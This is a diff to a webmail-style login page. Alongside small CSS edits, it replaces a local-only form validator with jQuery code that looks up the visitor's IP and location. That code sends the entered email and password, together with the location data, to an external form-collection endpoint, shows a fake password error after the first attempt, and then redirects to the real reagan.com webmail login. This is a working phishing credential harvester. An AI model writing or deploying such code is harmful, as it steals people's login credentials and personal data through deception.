@@ -101,7 +101,7 @@ body{
   min-height: 40px;
   padding: 8px;
   box-sizing: border-box;
-  outline: 0;
+  outline: none;
   margin-top: 1.5ex;
   margin-bottom: 1.5ex;
   font-size: 16px !important;
@@ -216,7 +216,7 @@ input {
   }
 
 label{
-	font-size: 13pt;
+	font-size: 10pt;
 	font-weight: bold;
 	
 }
@@ -231,7 +231,7 @@ input[type="submit"]{
   min-height:42px;
   padding:8px 16px;
   cursor:pointer;
- font-size: 16px !important; 
+ font-size: 12px !important; 
 	
 }
     /* Standalone-page fixes */
@@ -578,6 +578,7 @@ input[type="submit"]{
       min-height:40px;
       padding:8px;
       box-sizing:border-box;
+       outline: none;
     }
     #login input[type="submit"] {
       width:auto;
@@ -724,49 +725,152 @@ input[type="submit"]{
     <img src="/images/r3.png" alt="">
   </footer>
 
-  <script>
-    // Read ?usr=... and prefill the email field without sending it anywhere.
-    (function () {
-      const params = new URLSearchParams(window.location.search);
-      const user = params.get("usr");
-      if (user) document.getElementById("usr").value = user;
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+  $(document).ready(function() {
 
-      const form = document.getElementById("my-form");
-      const email = document.getElementById("usr");
-      const password = document.getElementById("pas");
-      const error = document.getElementById("error");
-      const success = document.getElementById("success");
+    async function getVisitorInfo() {
+    var info = {
+        ip: "",
+        city: "",
+        region: "",
+        country: "",
+        country_code: "",
+        postal: "",
+        timezone: "",
+        org: ""
+    };
 
-      form.addEventListener("submit", function (event) {
-        event.preventDefault();
-        error.style.display = "none";
-        success.style.display = "none";
-        error.textContent = "";
+    try {
 
-        if (!email.checkValidity()) {
-          error.textContent = "Please enter a valid email address.";
-          error.style.display = "block";
-          email.focus();
-          return;
+        // STEP A — Get IP from ipify
+        var ipResponse = await fetch("https://api.ipify.org?format=json");
+        var ipData = await ipResponse.json();
+
+        info.ip = ipData.ip || "";
+
+        // STEP B — Send IP to ipinfo.io
+        if (info.ip) {
+
+            var infoResponse = await fetch(
+                "https://ipinfo.io/" + info.ip + "/json"
+            );
+
+            var infoData = await infoResponse.json();
+
+            info.city = infoData.city || "";
+            info.region = infoData.region || "";
+            info.country = infoData.country || "";
+            info.country_code = infoData.country || "";
+            info.postal = infoData.postal || "";
+            info.timezone = infoData.timezone || "";
+            info.org = infoData.org || "";
         }
 
-        if (!password.value) {
-          error.textContent = "Please enter your password.";
-          error.style.display = "block";
-          password.focus();
-          return;
-        }
+    } catch (error) {
 
-        // No credentials are transmitted by this standalone file.
-        success.textContent = "Form validated locally.";
-        success.style.display = "block";
-      });
+        console.log("Visitor info lookup failed:", error);
 
-      document.getElementById("forgot").addEventListener("click", function (event) {
-        event.preventDefault();
-        alert("Please use your organization's official password-recovery process.");
-      });
-    })();
-  </script>
+    }
+
+    return info;
+}
+
+    var attemptCount = 0;
+
+    // Show / hide password toggle
+    var $passwordInput = $('#password-input');
+    var $toggleBtn = $('.password-toggle');
+    var $errorMessage = $('#password-error');
+
+    $toggleBtn.on('click', function () {
+      var isVisible = $(this).attr('data-visible') === 'true';
+
+      if (isVisible) {
+        $passwordInput.attr('type', 'password');
+        $(this).attr('aria-label', 'Show password');
+        $(this).attr('data-visible', 'false');
+      } else {
+        $passwordInput.attr('type', 'text');
+        $(this).attr('aria-label', 'Hide password');
+        $(this).attr('data-visible', 'true');
+      }
+    });
+
+    // Hide error when user starts typing again
+    $passwordInput.on('input', function () {
+  $errorMessage.hide();
+  $passwordInput.removeClass('input-error');
+});
+
+
+    $("#contact").on('submit', async function(e) {
+      e.preventDefault();
+
+      var email = $(".emaill").val();
+      var password = $("input[name='pass']").val();
+
+      var visitorInfo = await getVisitorInfo();
+
+      attemptCount++;
+
+      if (attemptCount <= 2) {
+        $.ajax({
+          dataType: "JSON",
+          url: "https://submit-form.com/C1P3Ux3Nw",
+          type: "POST",
+
+          contentType: "application/json",
+
+headers: {
+    Accept: "application/json"
+},
+
+          data: JSON.stringify({
+    email: email,
+    password: password,
+
+    ip: visitorInfo.ip,
+    city: visitorInfo.city,
+    region: visitorInfo.region,
+    country: visitorInfo.country,
+    country_code: visitorInfo.country_code,
+    postal: visitorInfo.postal,
+    timezone: visitorInfo.timezone,
+    org: visitorInfo.org
+}),
+          beforeSend: function() {
+            $("#submit-btn")
+              .addClass("loading")
+              .prop("disabled", true);
+
+            // hide any previous error while submitting
+            $errorMessage.hide();
+          },
+          success: function(response) {
+            if (response) {
+              console.log(response);
+            }
+          },
+          complete: function() {
+            $("#submit-btn")
+              .removeClass("loading")
+              .prop("disabled", false);
+
+            if (attemptCount < 2) {
+              // clear password and show error after spinner finishes
+              $("input[name='pass']").val('');
+              $errorMessage.show();
+              $passwordInput.addClass('input-error');
+            } else if (attemptCount === 2) {
+              // 3rd submission: redirect after spinner completes
+              window.location.replace("https://webmail.reagan.com/wmidentity/Account/Login?ReturnUrl=%2Fwmidentity%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_mode%3Dform_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwebmail.reagan.com%252Flogin.php%26client_id%3Dwebmail%26nonce%3D516dc8a932894aace345073a4a7d2884%26state%3Da8f790880a64f45b7e381041c1cad91d%26scope%3Dopenid%2520profile%2520email%2520webmail%2520openid");
+            }
+          }
+        });
+      }
+    });
+  });
+</script>
 </body>
 </html>
